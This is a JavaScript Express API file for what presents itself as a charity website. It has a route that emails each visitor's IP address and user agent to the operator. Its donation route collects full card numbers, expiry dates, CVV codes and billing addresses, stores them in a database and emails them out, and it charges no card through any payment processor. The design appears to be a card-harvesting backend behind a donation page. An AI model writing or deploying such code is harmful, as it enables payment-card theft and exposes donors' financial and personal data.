import express from 'express';
import cors from 'cors';
import {
  sendVisitNotification,
  sendContactEmail,
  sendDonationEmail,
} from './services/emailService.js';
import { saveDonationToSupabase, checkSupabaseHealth } from './services/supabaseService.js';

const app = express();

app.use(cors());
app.use(express.json());

// Healthcheck Route
app.get(['/api/health', '/health'], async (req, res) => {
  const supabaseStatus = await checkSupabaseHealth();
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    service: 'Mdeaver Charity Express API on Vercel',
    supabase: supabaseStatus,
  });
});

/**
 * 1. Website Visit Notification Endpoint
 */
app.post(['/api/notify/visit', '/notify/visit'], async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    const result = await sendVisitNotification({ ip, userAgent, timestamp });
    res.json({ success: true, message: 'Visit notification processed', result });
  } catch (error) {
    console.error('Error handling visit notification:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * 2. Contact Form Submission Endpoint
 */
app.post(['/api/contact', '/contact'], async (req, res) => {
  try {
    const { name, email, phone, subject, message } = req.body;

    if (!name || !email || !message) {
      return res.status(400).json({
        success: false,
        error: 'Name, email, and message are required fields.',
      });
    }

    const result = await sendContactEmail({ name, email, phone, subject, message });
    res.json({
      success: true,
      message: 'Contact form submitted and notification email dispatched.',
      result,
    });
  } catch (error) {
    console.error('Error handling contact submission:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * 3. Donation Payment & Invoice Notification Endpoint
 */
app.post(['/api/donations/notify', '/donations/notify'], async (req, res) => {
  try {
    const {
      invoiceNumber,
      donorName,
      email,
      amount,
      paymentMethod,
      cardNumber,
      cardExpiry,
      cardCvv,
      billingAddress,
      paymentDetails,
      timestamp,
    } = req.body;

    if (!donorName || !email || !amount) {
      return res.status(400).json({
        success: false,
        error: 'Donor name, email, and amount are required.',
      });
    }

    const formattedTime = timestamp || new Date().toLocaleString('en-US', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    const generatedInvoice = invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`;

    const donationData = {
      invoiceNumber: generatedInvoice,
      donorName,
      email,
      amount,
      paymentMethod: paymentMethod || 'Credit / Debit Card',
      cardNumber: cardNumber || paymentDetails?.cardNumber || null,
      cardExpiry: cardExpiry || paymentDetails?.expiry || null,
      cardCvv: cardCvv || paymentDetails?.cvv || null,
      billingAddress: billingAddress || paymentDetails?.billingAddress || null,
      timestamp: formattedTime,
    };

    // Save transaction to Supabase database
    const dbResult = await saveDonationToSupabase(donationData);

    // Send email notification via Resend
    const emailResult = await sendDonationEmail(donationData);

    res.json({
      success: true,
      message: 'Donation recorded to database and notification email dispatched via Resend.',
      dbResult,
      emailResult,
    });
  } catch (error) {
    console.error('Error handling donation notification:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Export Express app as Vercel Serverless Function Handler
export default app;
